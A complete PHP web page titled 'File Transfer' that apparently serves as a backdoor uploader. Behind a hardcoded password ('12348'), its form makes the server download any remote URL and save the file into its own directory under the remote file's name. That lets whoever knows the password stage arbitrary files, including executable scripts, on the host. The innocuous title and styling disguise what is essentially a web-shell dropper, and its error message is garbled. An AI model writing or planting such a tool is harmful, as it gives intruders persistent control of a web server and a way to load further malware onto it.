<html>

<head>
    <title>File Transfer</title>
    <style type="text/css">
        body {
            background: #F6F6F6;
            font-family: tahoma
        }

        form {
            width: 400px;
            margin: 11% auto;
        }

        form * {
            float: left;
        }

        form label {
            float: left;
            width: 138px;
        }

        form input[type="text"] {
            float: left;
            margin-bottom: 11px;
            width: 262px;
            background: #B4B4B4;
            padding: 3px 0;
            border: none;
            border-radius: 2px;
            color: #000;
            font: 11px tahoma;
            padding-left: 5px;
        }

        form input[type="submit"] {
            width: 100%;
            background: rgb(29, 171, 26) none repeat scroll 0% 0%;
            border-radius: 7px;
            padding: 4px 0px;
            border-width: medium medium 2px;
            border-style: none none solid;
            border-color: -moz-use-text-color -moz-use-text-color rgb(2, 78, 30);
            -moz-border-top-colors: none;
            -moz-border-right-colors: none;
            -moz-border-bottom-colors: none;
            -moz-border-left-colors: none;
            border-image: none;
            color: rgb(255, 255, 255);
            cursor: pointer;
        }

        .error {
            font: 11px tahoma;
            color: #0575AA;
            margin-top: 11px;
            width: 100%;
            text-align: center;
        }
    </style>

<body>
    <form action="" method="POST">
        <label for="link">Link :</label> <input type="text" id="link" name="link"><br />
        <label for="pass">Password :</label> <input type="text" size="30" id="pass" name="pass"><br />
        <input type="submit" name="submit" value="Up">
        <div class="error">
            <?php

            if (isset($_POST["pass"])) {
                $pass = $_POST["pass"];
                $link = $_POST["link"];
                if (!empty($pass) && $pass == 12348 && !empty($link)) {
                    define('BUFSIZ', 4095);
                    $url = $link;
                    $rfile = fopen($url, 'r');
                    $lfile = fopen(basename($url), 'w');
                    while (!feof($rfile))
                        fwrite($lfile, fread($rfile, BUFSIZ), BUFSIZ);
                    fclose($rfile);
                    fclose($lfile);
                    echo "File Uploaded";
                } else {
                    echo "Password is Not invalid !!";
                }
            }
            ?>
        </div>
    </form><br />

</body>

</html>